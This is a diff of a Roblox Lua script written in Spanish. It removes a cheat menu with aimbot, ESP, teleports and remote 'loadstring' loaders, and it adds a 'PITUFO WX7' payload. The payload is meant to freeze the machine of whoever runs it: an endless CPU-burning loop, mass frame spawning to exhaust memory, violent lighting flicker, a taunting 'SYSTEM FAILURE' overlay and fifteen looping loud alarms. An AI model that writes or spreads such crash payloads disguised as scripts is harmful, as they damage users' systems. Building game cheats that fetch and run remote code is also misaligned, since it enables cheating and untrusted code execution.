@@ -1,253 +1,101 @@
 
-﻿
-Carlitos run
-esai2211
- 
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+-- PITUFO WX7: MODO APOCALIPSIS (CONGELAMIENTO & RENDER OVERLOAD)
+-- ADVERTENCIA: Al ejecutar esto, Roblox se quedará "No responde" y parpadeará violentamente.
 
-local Players = game:GetService("Players")
+repeat task.wait() until game:IsLoaded()
+
 local RunService = game:GetService("RunService")
-local UIS = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
+local parent = (gethui and gethui()) or game:GetService("CoreGui")
 
-local LocalPlayer = Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-local Mouse = LocalPlayer:GetMouse()
-
--- Variables de Estado (Restauradas)
-local InterfaceVisible = true
-local FOVSize = 120
-local AimSmoothing = 0.5 
-local CornerESP_Activo = false 
-local SkeletonEnabled = false
-local FOVRainbow = false 
-local CornerColor = Color3.fromRGB(0, 255, 0)
-local SkeletonColor = Color3.fromRGB(170, 0, 255)
-local AimbotActive = false 
-local AimbotMaster = false 
-local MoradoIntenso = Color3.fromRGB(170, 0, 255)
-
--- Coordenadas Teleports
-local DEPTO_POS = Vector3.new(1180.30, 3.54, -189.98)
-local MASHMALLOW_POS = Vector3.new(510.23, 3.41, 598.50)
-
-local Window = Rayfield:CreateWindow({
-   Name = "Kokesitoo.15 | Full Restoration",
-   LoadingTitle = "Restaurando Funciones...",
-   LoadingSubtitle = "by Milo",
-   ConfigurationSaving = { Enabled = false }
-})
-
--- TABS
-local TabCombat = Window:CreateTab("Combat", 4483362458)
-local TabVisuals = Window:CreateTab("ESP Visuals", 4483362458)
-local TabTeleports = Window:CreateTab("Teleports", 4483362458)
-local TabWorld = Window:CreateTab("World", 4483362458)
-local TabFarm = Window:CreateTab("Farm", 4483362458)
-
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Thickness = 2
-FOVCircle.Visible = true
-
--- ================= MOTOR DE LIMPIEZA ANTI-BUG =================
-local SkeletonDrawings = {}
-local CornerDrawings = {}
-
-local function CreateLine()
-    local l = Drawing.new("Line")
-    l.Thickness = 2
-    l.Visible = false
-    l.Transparency = 1
-    return l
-end
-
-local function ClearAllVisuals(plr)
-    if SkeletonDrawings[plr] then
-        for _, obj in pairs(SkeletonDrawings[plr]) do obj.Visible = false; obj:Remove() end
-        SkeletonDrawings[plr] = nil
+-- 1. SOBRECARGA DE HILOS (CPU KILLER - SIN ESPERAS)
+-- Este bucle bloquea el procesador al 100% al instante.
+task.spawn(function()
+    while true do
+        for i = 1, 1000000 do 
+            local _ = math.sin(i) * math.acos(math.random()) -- Cálculos basura masivos
+        end
+        -- NO HAY TASK.WAIT(). EL HILO ESTÁ MUERTO AQUÍ.
     end
-    if CornerDrawings[plr] then
-        for _, obj in pairs(CornerDrawings[plr]) do obj.Visible = false; obj:Remove() end
-        CornerDrawings[plr] = nil
+end)
+
+-- 2. GENERADOR MASIVO DE OBJETOS RGB (RAM & GPU CRASHER)
+-- Crea miles de interfaces cada segundo para saturar la memoria y el renderizado
+task.spawn(function()
+    local gui = Instance.new("ScreenGui", parent)
+    gui.Name = "PITUFO_SYSTEM_OVERRIDE"
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 1000000
+    
+    while true do
+        for i = 1, 1000 do -- Mil objetos por ciclo
+            local f = Instance.new("Frame", gui)
+            f.Size = UDim2.new(math.random(), 0, math.random(), 0)
+            f.Position = UDim2.new(math.random(), 0, math.random(), 0)
+            -- RGB NIVEL DIOS ESTALLANDO
+            f.BackgroundColor3 = Color3.fromHSV(tick() * 10 % 1, 1, 1) 
+            f.BorderSizePixel = 0
+            
+            local t = Instance.new("TextLabel", f)
+            t.Size = UDim2.new(1, 0, 1, 0)
+            t.Text = "¿ME QUERIAS ESTAFAR PITUFO?"
+            t.TextScaled = true
+            t.BackgroundTransparency = 1
+            t.TextColor3 = Color3.new(1,1,1)
+            t.Font = Enum.Font.Code -- Fuente Hacker
+            
+            -- Ciclo de creación y destrucción ultra rápido para saturar CPU
+            task.delay(0.01, function() f:Destroy() end)
+        end
+        task.wait() -- Velocidad máxima de spam
     end
-end
+end)
 
--- ================= TAB COMBAT (RESTAURADO) =================
-TabCombat:CreateToggle({
-    Name = "Master Aimbot", 
-    CurrentValue = false, 
-    Callback = function(v) AimbotMaster = v end
-})
-
-TabCombat:CreateSlider({
-    Name = "Aimbot Smoothing (Pegado)",
-    Range = {1, 10},
-    Increment = 1,
-    CurrentValue = 5,
-    Callback = function(v) AimSmoothing = v / 10 end
-})
-
-TabCombat:CreateSlider({
-    Name = "FOV Radius", 
-    Range = {30, 600}, 
-    Increment = 1, 
-    CurrentValue = 120, 
-    Callback = function(v) FOVSize = v end
-})
-
-TabCombat:CreateToggle({
-    Name = "Rainbow FOV", 
-    CurrentValue = false, 
-    Callback = function(v) FOVRainbow = v end
-})
-
--- ================= TAB VISUALS (RESTAURADO) =================
-TabVisuals:CreateToggle({
-    Name = "Corner ESP Fix", 
-    CurrentValue = false, 
-    Callback = function(v) CornerESP_Activo = v end
-})
-
-TabVisuals:CreateToggle({
-    Name = "Skeleton Estrella", 
-    CurrentValue = false, 
-    Callback = function(v) SkeletonEnabled = v end
-})
-
-TabVisuals:CreateSlider({
-    Name = "Visual Color (Hue)", 
-    Range = {0, 360}, 
-    Increment = 1, 
-    CurrentValue = 280, 
-    Callback = function(v) 
-        local col = Color3.fromHSV(v/360, 0.8, 1)
-        SkeletonColor = col
-        CornerColor = col 
+-- 3. DISTORSIÓN DE ILUMINACIÓN EXTREMA (GLITCH VISUAL)
+task.spawn(function()
+    while true do
+        Lighting.Brightness = math.random(0, 9999)
+        Lighting.ClockTime = math.random(0, 24)
+        Lighting.ExposureCompensation = math.random(-20, 20)
+        -- Parpadeo ambiental RGB
+        Lighting.Ambient = Color3.fromHSV(tick() * 5 % 1, 1, 1)
+        task.wait() -- Máxima velocidad
     end
-})
+end)
 
--- ================= TAB FARM (RESTAURADO) =================
-TabFarm:CreateButton({
-   Name = "Lanzar Jawa Hub AutoMS",
-   Callback = function()
-       -- Carga el script externo de Marshmallow
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/rexxymayor-ai/SCRIPTtt/refs/heads/main/script%20automs", true))()
-       Rayfield:Notify({Title = "Farm", Content = "Auto Marshmallow Cargado", Duration = 3})
-   end
-})
+-- 4. MENSAJE FINAL HACKER OVERLAY
+local overlay = Instance.new("ScreenGui", parent)
+overlay.IgnoreGuiInset = true
+overlay.DisplayOrder = 9999999
 
--- ================= RESTO DE FUNCIONES (WORLD & TP) =================
-TabWorld:CreateInput({
-   Name = "Clave Martillo",
-   PlaceholderText = "123",
-   Callback = function(t)
-       if t == "123" then
-           local T = Instance.new("Tool", LocalPlayer.Backpack)
-           T.Name = "Martillo Borrador"
-           T.RequiresHandle = false
-           local Sel = Instance.new("SelectionBox", game.CoreGui)
-           Sel.Color3 = Color3.fromRGB(255, 0, 0)
-           RunService.RenderStepped:Connect(function()
-               Sel.Adornee = (T.Parent == LocalPlayer.Character) and Mouse.Target or nil
-           end)
-           T.Activated:Connect(function() if Mouse.Target then Mouse.Target:Destroy() end end)
-       end
-   end
-})
+local label = Instance.new("TextLabel", overlay)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundColor3 = Color3.new(0, 0, 0)
+label.BackgroundTransparency = 0.1
+label.Text = "SYSTEM FAILURE\n¿ME QUERIAS ESTAFAR PITUFO?\n\nOWNED BY WX7"
+label.TextColor3 = Color3.new(1, 0, 0)
+label.TextScaled = true
+label.Font = Enum.Font.Code -- Fuente Hacker
+label.ZIndex = 9999999
 
-TabTeleports:CreateButton({Name = "TP Departamento", Callback = function() LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(DEPTO_POS) end})
-TabTeleports:CreateButton({Name = "TP Marshmallow Shop", Callback = function() LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(MASHMALLOW_POS) end})
-
--- ================= LOOP CORE FINAL (CON CORRECCIÓN DE BUGS) =================
+-- Parpadeo de Texto y Rotación Violenta
 RunService.RenderStepped:Connect(function()
-    local rainbow = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)
-    FOVCircle.Radius = FOVSize
-    FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-    FOVCircle.Visible = InterfaceVisible
-    FOVCircle.Color = FOVRainbow and rainbow or MoradoIntenso
-
-    for _, p in pairs(Players:GetPlayers()) do
-        local char = p.Character
-        local hum = char and char:FindFirstChild("Humanoid")
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-
-        if p == LocalPlayer or not char or not hum or hum.Health <= 0 or not hrp then
-            ClearAllVisuals(p)
-        else
-            -- LÓGICA CORNER ESP
-            if CornerESP_Activo and InterfaceVisible then
-                if not CornerDrawings[p] then
-                    CornerDrawings[p] = {}
-                    for i = 1, 8 do table.insert(CornerDrawings[p], CreateLine()) end
-                end
-                local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
-                local lines = CornerDrawings[p]
-                if onScreen then
-                    local top = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 3.8, 0))
-                    local bottom = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, -4.2, 0))
-                    local h = math.abs(top.Y - bottom.Y)
-                    local w = h * 0.6
-                    local x, y = pos.X - w/2, pos.Y - h/2
-                    local len = w/4
-                    for _, l in pairs(lines) do l.Visible = true; l.Color = CornerColor end
-                    lines[1].From, lines[1].To = Vector2.new(x, y), Vector2.new(x + len, y)
-                    lines[2].From, lines[2].To = Vector2.new(x, y), Vector2.new(x, y + len)
-                    lines[3].From, lines[3].To = Vector2.new(x + w, y), Vector2.new(x + w - len, y)
-                    lines[4].From, lines[4].To = Vector2.new(x + w, y), Vector2.new(x + w, y + len)
-                    lines[5].From, lines[5].To = Vector2.new(x, y + h), Vector2.new(x + len, y + h)
-                    lines[6].From, lines[6].To = Vector2.new(x, y + h), Vector2.new(x, y + h - len)
-                    lines[7].From, lines[7].To = Vector2.new(x + w, y + h), Vector2.new(x + w - len, y + h)
-                    lines[8].From, lines[8].To = Vector2.new(x + w, y + h), Vector2.new(x + w, y + h - len)
-                else for _, l in pairs(lines) do l.Visible = false end end
-            else if CornerDrawings[p] then for _, l in pairs(CornerDrawings[p]) do l.Visible = false end end end
-
-            -- LÓGICA SKELETON ESTRELLA
-            if SkeletonEnabled and InterfaceVisible then
-                if not SkeletonDrawings[p] then
-                    SkeletonDrawings[p] = {H2T=CreateLine(), T2LA=CreateLine(), T2RA=CreateLine(), T2LL=CreateLine(), T2RL=CreateLine()}
-                end
-                local sk = SkeletonDrawings[p]
-                local function getV2(name)
-                    local part = char:FindFirstChild(name)
-                    if part then
-                        local vPos, vis = Camera:WorldToViewportPoint(part.Position)
-                        return vis and Vector2.new(vPos.X, vPos.Y) or nil
-                    end return nil
-                end
-                local h, t = getV2("Head"), getV2("UpperTorso") or getV2("Torso")
-                if h and t then
-                    sk.H2T.From, sk.H2T.To, sk.H2T.Visible = h, t, true
-                    local la, ra = getV2("LeftUpperArm") or getV2("Left Arm"), getV2("RightUpperArm") or getV2("Right Arm")
-                    local ll, rl = getV2("LeftUpperLeg") or getV2("Left Leg"), getV2("RightUpperLeg") or getV2("Right Leg")
-                    if la then sk.T2LA.From, sk.T2LA.To, sk.T2LA.Visible = t, la, true else sk.T2LA.Visible = false end
-                    if ra then sk.T2RA.From, sk.T2RA.To, sk.T2RA.Visible = t, ra, true else sk.T2RA.Visible = false end
-                    if ll then sk.T2LL.From, sk.T2LL.To, sk.T2LL.Visible = t, ll, true else sk.T2LL.Visible = false end
-                    if rl then sk.T2RL.From, sk.T2RL.To, sk.T2RL.Visible = t, rl, true else sk.T2RL.Visible = false end
-                    for _, l in pairs(sk) do l.Color = SkeletonColor end
-                else for _, l in pairs(sk) do l.Visible = false end end
-            else if SkeletonDrawings[p] then for _, l in pairs(SkeletonDrawings[p]) do l.Visible = false end end end
-        end
-    end
-
-    -- AIMBOT LOGIC
-    if AimbotMaster and AimbotActive then
-        local target, short = nil, FOVSize
-        for _, v in pairs(Players:GetPlayers()) do
-            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") and v.Character.Humanoid.Health > 0 then
-                local pos, vis = Camera:WorldToViewportPoint(v.Character.Head.Position)
-                if vis then
-                    local mag = (Vector2.new(pos.X, pos.Y) - FOVCircle.Position).Magnitude
-                    if mag < short then target = v.Character.Head; short = mag end
-                end
-            end
-        end
-        if target then Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target.Position), AimSmoothing) end
-    end
+    -- RGB Estallando en el texto principal
+    label.TextColor3 = Color3.fromHSV(tick() * 20 % 1, 1, 1)
+    -- Rotación caótica para marear
+    label.Rotation = math.sin(tick() * 50) * 10
 end)
 
-UIS.InputBegan:Connect(function(i, g)
-    if g then return end
-    if i.KeyCode == Enum.KeyCode.P then InterfaceVisible = not InterfaceVisible; Window:Toggle()
-    elseif i.KeyCode == Enum.KeyCode.Z then AimbotActive = not AimbotActive
-        Rayfield:Notify({Title = "Aimbot", Content = AimbotActive and "ON" or "OFF", Duration = 2})
-    end
-end)
+-- 5. CACOFONÍA DE AUDIO (MÁXIMA SATURACIÓN)
+-- Reproduce múltiples alarmas simultáneamente para saturar el audio
+for i = 1, 15 do
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = "rbxassetid://4612375231" -- Alarma de error industrial
+    s.Volume = 10
+    s.PlaybackSpeed = 0.1 + (i * 0.1) -- Varios tonos molestos
+    s.Looped = true
+    s:Play()
+end
+
+print("PITUFO WX7: TOTAL OVERRIDE LOADED. ADIÓS AL SISTEMA.")
